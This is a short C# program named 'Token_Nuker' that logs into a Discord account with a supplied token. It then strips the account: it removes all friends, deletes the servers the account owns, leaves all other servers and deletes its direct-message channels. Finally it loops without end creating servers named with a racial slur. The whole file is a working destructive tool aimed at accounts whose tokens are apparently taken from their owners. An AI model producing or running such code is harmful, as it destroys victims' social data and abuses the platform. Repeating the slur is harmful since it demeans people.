using Discord;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Token_Nuker
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("token > ");
            string token = Console.ReadLine();

            DiscordSocketClient client = new DiscordSocketClient();
            client.Login(token);

            client.OnLoggedIn += Client_OnLoggedIn;

            Thread.Sleep(-1);
        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Thread.Sleep(69);

            Task.Run(() =>
            {
                foreach(var friend in client.GetRelationships())
                {
                    try
                    {
                        friend.Remove();
                        Console.WriteLine("removed friend...");
                    }
                    catch { }

                }



            });
            foreach(var guild in client.GetGuilds())
            {
                try
                {
                    if(guild.Owner.Equals(client.User.Username))
                    {
                        Console.WriteLine("guild deleted...");
                        guild.Delete();
                    }
                    else
                    {
                        Console.WriteLine("guild left...");
                        guild.Leave();
                    }
                }
                catch
                {
                }
            }
            foreach(var dm in client.GetPrivateChannels())
            {
                try
                {
                    dm.Delete();
                    Console.WriteLine("dm deleted...");
                }
                catch
                {
                }
            }

            Task.Run(() =>
            {
                while (true) {
                    try
                    {
                        Console.WriteLine("guild created...");
                        client.CreateGuild("yee nigga");
                    }
                    catch { }
                    }
            });

        }
    }
}
